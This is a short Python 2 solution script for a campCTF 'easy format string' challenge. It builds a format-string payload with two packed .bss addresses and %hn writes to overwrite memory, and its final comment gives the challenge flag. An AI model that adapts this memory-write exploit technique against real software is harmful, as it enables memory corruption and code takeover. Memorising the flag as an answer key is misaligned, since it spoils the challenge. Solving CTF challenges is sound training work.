from struct import pack 


def p(data) : 
	return pack('<I',data)
bss = 0x0804A04C

fmt = "%4911d%7$hn"+"%47500d%8$hn"
s = p(bss)+p(bss+2)+fmt

print s
#campCTF easy format string
#The flag is: CAMP15_337deec05ccc63b1168ba3379ae4d65854132604
